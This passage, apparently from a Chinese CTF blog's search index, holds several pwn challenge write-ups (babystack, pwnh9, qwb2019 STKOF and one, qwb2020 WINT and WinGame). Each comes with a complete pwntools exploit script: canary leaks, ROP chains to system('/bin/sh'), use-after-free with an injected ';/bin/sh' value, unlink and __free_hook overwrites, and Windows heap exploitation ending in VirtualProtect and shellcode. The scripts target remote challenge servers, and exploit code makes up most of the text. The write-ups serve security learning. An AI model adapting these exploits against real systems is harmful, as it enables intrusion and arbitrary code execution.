p64(popedi) + p64(binsh_addr) + p64(system_addr) + &#x27;a&#x27;*(0xC8-0x48-24)  sh.send(payload)  sh.interactive() ","categories":["CTF"],"tags":["ROP","libc地址泄漏","x64"]},{"title":"pwnh8_babystack","url":"/2019/10/30/pwnh8-babystack/","content":"本题，用checksec检查二进制，发现开启了CANARY、NX、以及RELRO保护，CANARY是用来检测栈溢出的，canary是一个随机数，存储在栈里。程序通过对比栈里的canary值和读取到的实际canary值进行对比，如果不相等，则抛出异常。因此，为了绕过canary机制，我们需要先想泄露canary的值，然后利用栈溢出，把这个值放到payload中对应的位置里，这样，程序发现canary的值没变，我们就成功绕过。\n\n\n\n\n为了泄露canary的值，我们的利用一下puts函数的特性,puts函数会一直输出某地址的数据直到遇到\\x00\n通过IDA,我们发现这里CANARY存于栈底上面一个位置\n\n然后我们查看buf的位置，距离栈底0x90，那么buf距离canary的位置为0x88,。\n\n于是，我们先构造这样的payload，因为canary值开始的地方可能会有0数据，所以，我们使用循环，将0覆盖为a,一次次的尝试，当puts输出的数据长度大于我们发送的数据长度时，说明canary的值已经被泄露成功，我们要立即结束循环，并且记下当前覆盖了canary的多少个0数据，然后，我们在前面填充这么多个\\x00数据，最后截取前8字节数据，就得到了canary代表的字符串(是乱码)\n\n#0x88过后0x89开始便是canary，但由于0x89可能是0,为了利用put泄露canary，我们就先将这里覆盖为aa  payload = &#x27;a&#x27;*(0x88)    c = &#x27;&#x27;  #覆盖canary的前导0  for i in range(0,8):     sh.send(payload+&#x27;a&#x27;*i)     sh.recvuntil(&#x27;&gt;&gt; &#x27;)     sh.sendline(&#x27;2&#x27;)     sh.recv(0x88+i)     c = sh.recvuntil(&#x27;\\n&#x27;).split(&#x27;\\n&#x27;)[0]  #   print c     l = len(c)     if l &gt; 4: #长度大于我们发送的字符串长度，说明数据已经暴露出来了        break;     sh.recvuntil(&#x27;&gt;&gt; &#x27;)     sh.sendline(&#x27;1&#x27;)  #print c  #补齐8字节  for j in range(0,i):     c = &#x27;\\x00&#x27; + c    #取前8字节数据，这才是canary  c = c[0:8]  \n\n得到了canary，我们就可以进行栈溢出ROP操作了还有一点就是，本题给的libc是假的，和服务器上的不一致，因此我们使用libcSearcher，而不使用这个库。\nX64传参的方式当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9\n因此，为了将数据放入rdi寄存器，我们需要找到一条pop rdi的指令，我们不能把指令写在栈里，因为开启了栈不可执行保护。我们发现了，在IDA中搜索pop，我们发现了这里可以被我们利用\n\n\n我们选择pop r15，选择undefine\n\n\n然后选择下面的两字节数据，选择Code\n\n\n这样，就出现了pop rdi指令,这是一种巧妙的方法，类似的，我们可以对r14,r13操作，获得其他相关指令，它的地址为0x400A93，并且过后还有一个retn，我们完全可以把这里看成是一个函数的开始\n\n\n我们最终的脚本\n#coding:utf8  #本题给的libc是假的，所以我们使用LibcSearcher  from pwn import *  from LibcSearcher import *    #context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]  #context.log_level=&#x27;debug&#x27;    #sh = process(&#x27;./babystack&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,39287)  sh.recvuntil(&#x27;&gt;&gt; &#x27;)    sh.sendline(&#x27;1&#x27;)    #0x88过后0x89开始便是canary，但由于0x89可能是0,为了利用put泄露canary，我们就先将这里覆盖为aa  payload = &#x27;a&#x27;*(0x88)    c = &#x27;&#x27;  #覆盖canary的前导0  for i in range(0,8):     sh.send(payload+&#x27;a&#x27;*i)     sh.recvuntil(&#x27;&gt;&gt; &#x27;)     sh.sendline(&#x27;2&#x27;)     sh.recv(0x88+i)     c = sh.recvuntil(&#x27;\\n&#x27;).split(&#x27;\\n&#x27;)[0]  #   print c     l = len(c)     if l &gt; 4: #长度大于我们发送的字符串长度，说明数据已经暴露出来了        break;     sh.recvuntil(&#x27;&gt;&gt; &#x27;)     sh.sendline(&#x27;1&#x27;)    #print c  #补齐8字节  for j in range(0,i):     c = &#x27;\\x00&#x27; + c    #取前8字节数据，这才是canary  c = c[0:8]    #print c  canary = u64(c)    print &#x27;canary=&#x27;,hex(canary)  mainaddr = 0x400908  elf = ELF(&#x27;./babystack&#x27;)    #经过验证，我们尽量暴露那些程序中使用的函数,假如我们改成write函数，发现不能getshell  put_got = elf.got[&#x27;puts&#x27;]  put_plt = elf.sym[&#x27;puts&#x27;]  #pop edi指令所在的地址  #64位函数参数传递方式,当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9  popedi = 0x400A93    popesi = 0x400a91    #暴露了canary，接下来，我们就可以利用栈溢出了,函数重新返回到main  payload = &#x27;a&#x27;*0x88 + p64(canary) + &#x27;a&#x27;*8 + p64(popedi) + p64(put_got) + p64(put_plt) + p64(mainaddr)    sh.recvuntil(&#x27;&gt;&gt; &#x27;)  sh.sendline(&#x27;1&#x27;)  sh.send(payload)    sh.recvuntil(&#x27;&gt;&gt; &#x27;)  sh.sendline(&#x27;3&#x27;)    #泄露puts的加载地址  puts_addr = u64( (sh.recvuntil(&#x27;\\n&#x27;).split(&#x27;\\n&#x27;)[0].ljust(8,&#x27;\\x00&#x27;)) )    libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)    #获取libc加载基地址  libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)  #获取system加载地址  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  #获取binsh字符串  binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)    print &#x27;system() addr=&#x27;,hex(system_addr)  print &#x27;binsh addr=&#x27;,hex(binsh_addr)    #getshell  payload = &#x27;a&#x27;*0x88 + p64(canary) + &#x27;a&#x27;*8 + p64(popedi) + p64(binsh_addr) + p64(system_addr)  sh.recvuntil(&#x27;&gt;&gt; &#x27;)  sh.sendline(&#x27;1&#x27;)  sh.send(payload)    #执行getshell  sh.recvuntil(&#x27;&gt;&gt; &#x27;)  sh.sendline(&#x27;3&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","ROP"]},{"title":"pwnh9","url":"/2019/10/30/pwnh9/","content":"知识点1在linux shell中，假如有如下语句,这就是shell注入方面echo ‘’;ls;cat 1.txt;&#x2F;bin&#x2F;sh;’’则ls、cat 1.txt、&#x2F;bin&#x2F;sh这三个命令会依次执行，这也就是本题突破的关键\n知识点2C语言或C++ 申请内存后，用free或delete释放堆后，指针的值还在，如果不手动设置为NULL，就可以被我们利用。\n堆内存的分配有规律，我们用如下的代码做试验\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;    int main() &#123;      for (int i=1;i&lt;=100;i++) &#123;          char *c = (char *)malloc(i);          printf(&quot;0x%x\\n&quot;,(long)c);          free(c);          printf(&quot;0x%x\\n&quot;,(long)c);      &#125;      return 0;  &#125;  \n发现，输出的地址全部都一样，这说明，当前一个堆释放后，新创建的堆的地址就是前一个堆的地址\n那么，我们来看题选项5退出时，释放了堆内存，但是并没有将指针设置为NULL，因此指针仍然指向原来的那个地址。\n\n\n选项4，有system，这里判断ptr的内容是否为空，于是我们在退出时，选择不退出，这样我们释放了第一个堆，然后我们在选项3中输入注入语句，创建的堆的地址就是第一个堆的地址，也就是ptr指向的内容 ，最后再选择4，执行getshell。这就是UAF(use After Free)漏洞，通过UAF使得set_time_zone分配得到的是set_format释放掉的内存。\n\n\n这样，格式化字符串后的command就是\n&#x2F;bin&#x2F;date -d @0 + “;&#x2F;bin&#x2F;sh”\n于是我们的脚本这样写\nfrom pwn import *    #sh = process(&#x27;./pwnh9&#x27;)    sh = remote(&#x27;111.198.29.45&#x27;,57042)    sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)    sh.sendline(&#x27;test&#x27;)    sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;5&#x27;)    sh.sendlineafter(&#x27;Are you sure you want to exit (y/N)?&#x27;,&#x27;N&#x27;)    sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)    sh.sendlineafter(&#x27;Time zone:&#x27;,&quot;&#x27;;/bin/sh&#x27;&quot;)    sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)    sh.interactive()  \n\n\n\n\n","categories":["CTF"],"tags":["UAF","命令注入"]},{"title":"qwb2019_STKOF(栈溢出拟态)","url":"/2020/04/09/qwb2019_STKOF/","content":"给了我们两个二进制，分别为32位和64位，两个程序功能完全相同，有一个裁决程序，fork出这两个程序，并监听着它们的输出，如果两者输出不一样或者一方崩溃，则裁决程序就会kill掉它们两个。\n首先，我们检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，32位\n\n\n64位\n\n\n可知**[32位溢出的距离为0x110,64位溢出的距离为0x118。]{.mark}**由于程序没有开启PIE，并且glibc静态编译到了程序里。我们所需的gadgets不用愁，也不需要泄露。我们可以在32位里调用add esp,XXX。将栈迁移到64位rop的后面，进而能够与64位rop相隔，构造出一个适用于两者的payload。\n布局如下。\n\n\n#coding:utf8from pwn import *&#x27;&#x27;&#x27;sh32 = process(&#x27;./pwn1&#x27;)sh64 = process(&#x27;./pwn2&#x27;)&#x27;&#x27;&#x27;sh = remote(&#x27;node3.buuoj.cn&#x27;,29103)elf32 = ELF(&#x27;./pwn1&#x27;)elf64 = ELF(&#x27;./pwn2&#x27;)#64位gadgetspop_rax = 0x000000000043b97cpop_rdi = 0x00000000004005f6pop_rsi = 0x0000000000405895pop_rdx = 0x000000000043b9d5syscall = 0x00000000004011dcread64 = elf64.sym[&#x27;read&#x27;]bss64 = 0x00000000006A32E0#32位gadgetspop_eax = 0x080a8af6#pop edx ; pop ecx ; pop ebx ; retpop_edx_ecx_ebx = 0x0806e9f1int80 = 0x080495a3read32 = elf32.sym[&#x27;read&#x27;]bss32 = 0x080DA320#add esp, 0x7c ; pop ebx ; pop esi ; pop edi ; pop ebp ; retadd_esp_8C = 0x0804933f#payload32 = &#x27;a&#x27;*0x110 + p32(read32) + p32(pop_edx_ecx_ebx) + p32(0) + p32(bss32) + p32(0x10)#payload64 = &#x27;a&#x27;*0x118 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss64) + p64(pop_edx) + p64(0x10) + p64(read64)payload = &#x27;a&#x27;*0x110#32位rop开始，调整esp，使得栈迁移到64位rop的后面payload += p32(add_esp_8C) + p32(0) #0截断puts的输出#64位rop#read(0,bss64,0x10)输入/bin/sh字符串payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss64) + p64(pop_rdx) + p64(0x10) + p64(read64)#execve(bss64,0,0)payload += p64(pop_rdi) + p64(bss64) + p64(pop_rax) + p64(59) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)payload = payload.ljust(0x1A0,&#x27;\\x00&#x27;)#32位rop#read(0,bss32,0x10)payload += p32(read32) + p32(pop_edx_ecx_ebx) + p32(0) + p32(bss32) + p32(0x10)#execve(bss32,0,0)payload += p32(pop_eax) + p32(0xB) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss32) + p32(int80)#raw_input()sh.sendafter(&#x27;try to pwn it?&#x27;,payload)sleep(0.5)sh.send(&#x27;/bin/sh\\x00&#x27;)sh.interactive()","categories":["CTF"],"tags":["栈溢出","ROP","拟态"]},{"title":"qwb2019_one(strchr的off by one)","url":"/2020/06/11/qwb2019_one/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，test功能里abs函数存在溢出，由此可以造成下标越界，进而可以泄露程序的地址。\n\n\n在edit功能里，strchr可以返回字符串结尾的’0’的位置，因此可以造成off by one，我们每一次进行off by one将结尾的0改掉，这样，我们就可以一步一步的逼近下一个chunk的size处，进而可以修改size\n\n\n我们可以通过控制size，然后伪造chunk，进行unlink操作，然后就能实现任意地址读写了。然后写free_hook即可\n#coding:utf8from pwn import *#sh = process(&#x27;./qwb2019_one&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,27591)elf = ELF(&#x27;./qwb2019_one&#x27;)free_got = elf.got[&#x27;free&#x27;]libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]free_s = libc.sym[&#x27;free&#x27;]system_s = libc.sym[&#x27;system&#x27;]def add(string):   sh.sendlineafter(&#x27;command&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendafter(&#x27;test string:&#x27;,string)def edit(index,old_c,new_c):   sh.sendlineafter(&#x27;command&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index of the string:&#x27;,str(index))   sh.sendafter(&#x27;Which char do you want to edit:&#x27;,old_c)   sh.sendlineafter(&#x27;What do you want to edit it into:&#x27;,new_c)def show(index):   sh.sendlineafter(&#x27;command&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;index of the string:&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;command&gt;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;index of the string:&#x27;,str(index))def test(index):   sh.sendlineafter(&#x27;command&gt;&gt;&#x27;,&#x27;12580&#x27;)   sh.sendlineafter(&#x27;Do you want to use one?(Y/N)&#x27;,&#x27;Y&#x27;)   sh.sendlineafter(&#x27;Here are 5 strings to be tested. Which one do you want to test?&#x27;,str(index))#abs溢出test(0x80000000)#泄露elf地址sh.recvuntil(&#x27;The string:\\n&#x27;)heap0_ptr_addr = u64(sh.recv(6).ljust(0x8,&#x27;\\x00&#x27;))elf_base = heap0_ptr_addr - 0x2030C0free_got_addr = elf_base + free_gotprint &#x27;heap0_ptr_addr=&#x27;,hex(heap0_ptr_addr)print &#x27;elf_base=&#x27;,hex(elf_base)char_table = &#x27;&#x27;for i in range(0x20):   char_table += chr(ord(&#x27;a&#x27;)+i)add(char_table) #0add(&#x27;b&#x27;*0x20) #1add(&#x27;/bin/sh\\x00&#x27;) #2#3~0x11for i in range(0xF):   add(&#x27;b&#x27;*0x20)#0x12add(&#x27;c&#x27;*0x20)#一步一步的将\\x00替换为a，使得我们可以到达chunk1的size处for i in range(0x18):   edit(0,&#x27;\\x00&#x27;,chr(ord(&#x27;B&#x27;) + i))size = 0x40 * 0x11#修改chunk1的sizeedit(0,&#x27;\\x41\\n&#x27;,p8(size &amp; 0xFF))edit(0,&#x27;\\x00&#x27;,p8((size &gt;&gt; 0x8) &amp; 0xFF))#现在修改chunk1的prev_sizefor i in range(0x17,0x10,-1): #清空prev_size的高7字节   edit(0,chr(ord(&#x27;B&#x27;) + i) + &#x27;\\n&#x27;,&#x27;\\x00&#x27;)#写prev_sizeedit(0,chr(ord(&#x27;B&#x27;) + 0x10) + &#x27;\\n&#x27;,p8(0x30))#现在开始，在chunk0里伪造fake_chunkfake_chunk = p64(0) + p64(0x31)fake_chunk += p64(heap0_ptr_addr - 0x18) + p64(heap0_ptr_addr - 0x10)#倒序写入for i in range(0x1F,-1,-1):   edit(0,chr(ord(&#x27;a&#x27;)+i)+&#x27;\\n&#x27;,fake_chunk[i])#unlinkdelete(1)#现在控制了堆指针数组for i in range(0x18):   edit(0,&#x27;\\x00&#x27;,&#x27;1&#x27;)#使得堆指针0指向数组的第二个位置edit(0,&#x27;\\xA8\\n&#x27;,&#x27;\\xC8&#x27;)#写入free_got的地址for i in range(6):   edit(0,&#x27;\\x00&#x27;,p8((free_got_addr &gt;&gt; (8 * i)) &amp; 0xFF))show(1)sh.recvuntil(&#x27;The string is:\\n&#x27;)free_addr = u64(sh.recv(6).ljust(0x8,&#x27;\\x00&#x27;))libc_base = free_addr - free_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + system_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)#修改堆数组指针第二个，指向free_hookfor i in range(6):   edit(0,p8((free_got_addr &gt;&gt; (8 * i)) &amp; 0xFF) + &#x27;\\n&#x27;,p8((free_hook_addr &gt;&gt; (8 * i)) &amp; 0xFF))#写free_hookfor i in range(6):   edit(1,&#x27;\\x00&#x27;,p8((system_addr &gt;&gt; (8 * i)) &amp; 0xFF))#getshelldelete(2)sh.interactive()","categories":["CTF"],"tags":["off by one","abs函数溢出","strchr函数溢出"]},{"title":"qwb2020_WINT","url":"/2020/08/21/qwb2020-WINT/","content":"edit功能存在溢出，可以控制string对象，来实现任意地址读写\n\n控制string对象，泄露出exe基址和dll的基址，然后就是泄露peb、teb地址，得到stack_base，为了能够准确得到栈rop的地址，我们在栈里布置一个字符串用来做TAG，然后利用任意地址读写从stack_base处开始搜索栈，直到找到我们布下的这个TAG。然后就是做ROP更改堆的执行权限后跳到堆里执行shellcode。\n#coding:utf8from pwn import *local = False#sh = remote(&#x27;192.168.232.147&#x27;,6666)sh = remote(&#x27;121.40.103.62&#x27;,1337)kernel32_free = 0x1180VirtualProtect = 0x14F0CreateFileA = 0x2F00ReadFile = 0x1DE0WriteFile = 0x1E10GetStdHandle = 0x16E0HeapAlloc = 0x30810ntdll_PebLdr = 0x1313c8#pop r9 ; pop r8 ; pop rdx ; pop rcx ; jmp raxpop_4 = 0x92ea3pop_rax = 0x1548c#context.log_level = &#x27;debug&#x27;def add(name,size,content):   sh.sendlineafter(&#x27;4. Exit&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;name:&#x27;,name)   sh.sendlineafter(&#x27;age:&#x27;,str(size))   sh.sendafter(&#x27;data:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;4. Exit&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;4. Exit&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))def edit(index,size,name,content):   sh.sendlineafter(&#x27;4. Exit&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))   sh.sendlineafter(&#x27;name:&#x27;,name)   sh.sendlineafter(&#x27;age:&#x27;,str(size))   sh.sendafter(&#x27;data:&#x27;,content)add(&#x27;0&#x27;*0x10,0x20,&#x27;a&#x27;*0x20) #0add(&#x27;1&#x27;*0x10,0x20,&#x27;b&#x27;*0x20) #1add(&#x27;2&#x27;*0x10,0x20,&#x27;c&#x27;*0x20) #2#raw_input()if local:   exe_base = 0x7FF7F09A0000else:   #溢出   edit(0,0x32,&#x27;0&#x27;*0x10,&#x27;a&#x27;*0x30 + &#x27;\\x70\\x74&#x27;)   show(1)   sh.recvuntil(&#x27;name: &#x27;)   exe_base = u64(sh.recv(8)) - 0x3d650free_iat = exe_base + 0x34010print &#x27;exe_base=&#x27;,hex(exe_base)edit(0,0x38,&#x27;0&#x27;*0x10,&#x27;a&#x27;*0x30 + p64(free_iat))show(1)sh.recvuntil(&#x27;name: &#x27;)free_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))kernel32_base = free_addr - kernel32_freeprint &#x27;kernel32_base=&#x27;,hex(kernel32_base)VirtualProtect_addr = kernel32_base + VirtualProtectCreateFileA_addr = kernel32_base + CreateFileAReadFile_addr = kernel32_base + ReadFileWriteFile_addr = kernel32_base + WriteFileGetStdHandle_addr = kernel32_base + GetStdHandlesc = &#x27;&#x27;&#x27;sub rsp,0x8 /*栈对齐*/        mov rax,0x7478        mov [rsp+0x110],rax        mov rax,0x742E67616C665C5C        mov [rsp+0x108],rax        mov rax,0x544E49575C5C3A43        mov [rsp+0x100],rax        mov qword ptr[rsp+0x30],0 /*hTemplateFile*/        mov qword ptr[rsp+0x28],0x80 /* dwFlagsAndAttributes*/        mov qword ptr[rsp+0x20],3 /* dwCreationDisposition*/        lea rcx,[rsp+0x100]        mov edx,0x80000000        mov r8d,1        xor r9d,r9d        mov rax,%d        call rax /*CreateFileA打开文件*/        mov qword ptr[rsp+0x20],0        mov qword ptr[rsp+0x28],0        mov rcx,rax         /*hFile*/        lea rdx,[rsp+0x200]  /*lpBuffer*/        mov r8d,0x100       /*nNumberOfBytesToRead*/        xor r9d,r9d        mov rax,%d        call rax /*ReadFile*/        mov ecx, 0xfffffff5 /*STD_OUTPUT_HANDLE*/        mov rax, %d        call rax /* GetStdHandle*/        mov qword ptr [rsp+0x20],0 /*lpOverlapped*/        mov rcx,rax                /*hFile*/        lea rdx,[rsp+0x200]                /*lpBuffer*/        mov r8d,0x100              /*nNumberOfBytesToWrite*/        xor r9d, r9d               /*lpNumberOfBytesWritten*/        mov rax, %d        call rax /*WriteFile*/     &#x27;&#x27;&#x27; % (CreateFileA_addr,ReadFile_addr,GetStdHandle_addr,WriteFile_addr)shellcode = asm(sc,arch=&#x27;amd64&#x27;)add(&#x27;3&#x27;*0x10,len(shellcode),shellcode) #3heap_ptr_addr = exe_base + 0x4cbd0edit(0,0x38,&#x27;0&#x27;*0x10,&#x27;a&#x27;*0x30 + p64(heap_ptr_addr))show(1)sh.recvuntil(&#x27;name: &#x27;)heap_addr = u64(sh.recv(8))shellcode_addr = heap_addr + 0x190print &#x27;shellcode_addr=&#x27;,hex(shellcode_addr)HeapAlloc_iat = exe_base + 0x34020edit(0,0x38,&#x27;0&#x27;*0x10,&#x27;a&#x27;*0x30 + p64(HeapAlloc_iat))show(1)sh.recvuntil(&#x27;name: &#x27;)ntdll_base = u64(sh.recv(8)) - HeapAllocntdll_PebLdr_addr = ntdll_base + ntdll_PebLdrpop_4 += ntdll_basepop_rax += ntdll_baseprint &#x27;ntdll_base=&#x27;,hex(ntdll_base)print &#x27;ntdll_PebLdr_addr=&#x27;,hex(ntdll_PebLdr_addr)edit(0,0x38,&#x27;0&#x27;*0x10,&#x27;a&#x27;*0x30 + p64(ntdll_PebLdr_addr))show(1)sh.recvuntil(&#x27;name: &#x27;)Peb_addr = u64(sh.recv(8)) - 0x80Teb_addr = Peb_addr - 0x2000print &#x27;Peb_addr=&#x27;,hex(Peb_addr)print &#x27;Teb_addr=&#x27;,hex(Teb_addr)stack_base_ptr = Teb_addr + 0x10print &#x27;stack_base_ptr=&#x27;,hex(stack_base_ptr)edit(0,0x38,&#x27;0&#x27;*0x10,&#x27;a&#x27;*0x30 + p64(stack_base_ptr ))show(1)sh.recvuntil(&#x27;name: &#x27;)stack_base = u64(sh.recv(8))print &#x27;stack_base=&#x27;,hex(stack_base)#在栈里做一个标记，然后我们搜索栈tag = &#x27;100 &#x27;.ljust(0x8,&#x27;\\x00&#x27;) + &#x27;TAhaivkG&#x27;delete(tag)addr = stack_basewhile True:   print &#x27;searching &#x27;,hex(addr),&#x27;....&#x27;   edit(0,0x48,&#x27;0&#x27;*0x10,&#x27;a&#x27;*0x30 + p64(addr) + p64(0x10) + p64(0x1000))   show(1)   sh.recvuntil(&#x27;name: &#x27;)   data = sh.recv(0x1000)   if &#x27;TAhaivkG&#x27; in data:      print &#x27;found tag in stack&#x27;      break   addr += 0x1000rop_addr = (addr + data.index(&#x27;TAhaivkG&#x27;)) &amp; 0xFFFFFFFFFFFFFFF0rop_addr += 0x18print &#x27;rop_addr=&#x27;,hex(rop_addr)rop = p64(pop_rax) + p64(VirtualProtect_addr)rop += p64(pop_4)rop += p64(rop_addr) #oldprop += p64(0x40) #flagrop += p64(0x110) #lenrop += p64(shellcode_addr) #ptr#ret2shellcoderop += p64(shellcode_addr)edit(0,0x60,&#x27;0&#x27;*0x10,&#x27;a&#x27;*0x30 + p64(rop_addr) + p64(0x10) + p64(0x4F) + p64(0) + p64(rop_addr) + p64(len(rop)))#写ropraw_input()edit(1,len(rop),&#x27;b&#x27;,rop)sh.interactive()","categories":["CTF"],"tags":["ROP","shellcode","堆溢出","windows漏洞利用"]},{"title":"qwb2020_WinGame","url":"/2020/08/21/qwb2020-WinGame/","content":"warm_up里的edit功能存在溢出\n\n利用堆喷将Src字符串对象布置到堆的后面\n\n然后利用溢出控制Src字符串对象里的size成员，即可实现越界读，从而泄露出key和程序基址\n\n有了key以后，即可记录game功能，game功能里存在UAF，利用起来做unlink即可\n\n#coding:utf8from pwn import *#sh = remote(&#x27;192.168.232.137&#x27;,6666)sh = remote(&#x27;120.55.89.74&#x27;,12345)#sh = remote(&#x27;192.168.232.145&#x27;,6666)context.log_level = &#x27;debug&#x27;def warm_up():    sh.sendlineafter(&#x27;Command: &#x27;, &#x27;1&#x27;)def go_back():    sh.sendlineafter(&#x27;Command: &#x27;, &#x27;6&#x27;)def game(secret):    sh.sendlineafter(&#x27;Command: &#x27;, &#x27;2&#x27;)    sh.sendlineafter(&#x27;Secret:&#x27;,secret)def add(size, content,line = True):    sh.sendlineafter(&#x27;Command: &#x27;, &#x27;1&#x27;)    sh.sendlineafter(&#x27;size:&#x27;, str(size))    if line:       sh.sendlineafter(&#x27;Note:&#x27;, content)    else:       sh.sendafter(&#x27;Note:&#x27;, content)def delete(index):    sh.sendlineafter(&#x27;Command: &#x27;, &#x27;2&#x27;)    sh.sendlineafter(&#x27;index:&#x27;, str(index))def edit(index, content):    sh.sendlineafter(&#x27;Command: &#x27;, &#x27;3&#x27;)    sh.sendlineafter(&#x27;index:&#x27;, str(index))    sh.sendlineafter(&#x27;note:&#x27;, content)def show(index):    sh.sendlineafter(&#x27;Command: &#x27;, &#x27;4&#x27;)    sh.sendlineafter(&#x27;index:&#x27;, str(index))def show_at(index,offset):    sh.sendlineafter(&#x27;Command: &#x27;, &#x27;5&#x27;)    sh.sendlineafter(&#x27;show?&#x27;, str(index))    sh.sendlineafter(&#x27;show:&#x27;,str(offset))def encourage(index):    sh.sendlineafter(&#x27;Command: &#x27;, &#x27;4&#x27;)    sh.sendlineafter(&#x27;get?&#x27;,str(index))warm_up()add(0x100,&#x27;a&#x27;*0x100) #0add(0x100,&#x27;b&#x27;*0x100) #1add(0x100,&#x27;c&#x27;*0x100) #2add(0x100,&#x27;d&#x27;*0x100) #3delete(2)#将encourage1堆喷到chunk2里for i in range(1):   encourage(1)#将encourage0堆喷到chunk3里delete(3)for i in range(6):   encourage(0)#利用1修改宽字节对象的sizeedit(1,&#x27;a&#x27;*0x108)edit(1,&#x27;a&#x27;*0x108 + p16(0xFFFF))#泄露keyshow_at(1,132)key = sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True)show_at(1,133)key += sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True)key = u32(key)print &#x27;key=&#x27;,hex(key)#泄露程序的基址前2字节show_at(1,131)exe_addr = u32((&#x27;\\xA0\\x47&#x27; + sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True)).ljust(4,&#x27;\\x00&#x27;))exe_base = exe_addr - 0x47A0print &#x27;exe_base=&#x27;,hex(exe_base)go_back()game(p32(key))add(0x20,&#x27;a&#x27;*0x20) #0add(0x20,&#x27;b&#x27;*0x20) #1show(0)sh.recvuntil(&#x27;a&#x27;*0x20)#泄露出chunk1的加密的头headerentry_header_4 = u32(sh.recv(4))entry_cookie = 0x4010005 ^ entry_header_4print &#x27;entry_cookie=&#x27;,hex(entry_cookie)#通过伪造一个能够通过校验的size，从而通过unlink堆堆头合法检查flag = (entry_cookie &gt;&gt; 0x10) &amp; 0xFFsmallTagIndex = (entry_cookie &gt;&gt; 0x18) &amp; 0xFFsize = flag ^ smallTagIndex ^ ((entry_cookie &gt;&gt; 0x8) &amp; 0xFF) ^ (entry_cookie &amp; 0xFF)print &#x27;size=&#x27;,hex(size)if size &gt; 0xFF:   raise Exception(&#x27;retry&#x27;)add(size,&#x27;c&#x27;*size) #2add(0x100,&#x27;d&#x27;*0x100) #3add(0x100,&#x27;e&#x27;*0x100) #4add(0x100,&#x27;f&#x27;*0x100) #5add(0x100,&#x27;g&#x27;*0x100) #6add(0x100,&#x27;h&#x27;*0x100) #7add(0x100,&#x27;h&#x27;*0x100) #8add(0x100,&#x27;h&#x27;*0x100) #9add(0x100,&#x27;h&#x27;*0x100) #10remain = (size / 8 + 1) * 8 + 0x8 + 0x8add(remain,&#x27;h&#x27;*remain)delete(8)heap4_ptr_addr = exe_base + 0x64F8delete(4)edit(4,p32(heap4_ptr_addr - 0x4) + p32(heap4_ptr_addr))#unlinkdelete(5)free_iat = exe_base + 0x40BCedit(4,p32(free_iat) + p32(0x4) + p32(exe_base + 0x4034) + p32(0x4) + p32(heap4_ptr_addr) + p32(0x110) + p32(exe_base + 0x6020) + p32(4))show(4)sh.recvuntil(&#x27;Note:&#x27;)ucrtbase_base = u32(sh.recv(4)) - 0x34460system_addr = ucrtbase_base + 0xEFDA0print &#x27;ucrtbase_base=&#x27;,hex(ucrtbase_base)print &#x27;system_addr=&#x27;,hex(system_addr)#修改edit的次数限制edit(7,p32(0x110))show(5)sh.recvuntil(&#x27;Note:&#x27;)ntdll_base = u32(sh.recv(4)) - 0x66e90ntdll_PebLdr_addr = ntdll_base + 0x120c0cprint &#x27;ntdll_base=&#x27;,hex(ntdll_base)print &#x27;ntdll_PebLdr_addr=&#x27;,hex(ntdll_PebLdr_addr)raw_input()edit(6,p32(ntdll_PebLdr_addr))show(4)sh.recvuntil(&#x27;Note:&#x27;)Peb_addr = u32(sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True).ljust(4,&#x27;\\x00&#x27;)) - 0x21Cprint &#x27;Peb_addr=&#x27;,hex(Peb_addr)stack_ptr_addr = Peb_addr + 0x3000edit(6,p32(stack_ptr_addr))show(4)sh.recvuntil(&#x27;Note:&#x27;)stack_addr = u32(sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True).ljust(4,&#x27;\\x00&#x27;))print &#x27;stack_addr=&#x27;,hex(stack_addr)rop_addr = stack_addr + 0x128edit(6,p32(rop_addr) + p32(0x100))#写ropedit(4,p32(system_addr) + p32(0) + p32(rop_addr + 0xC) + 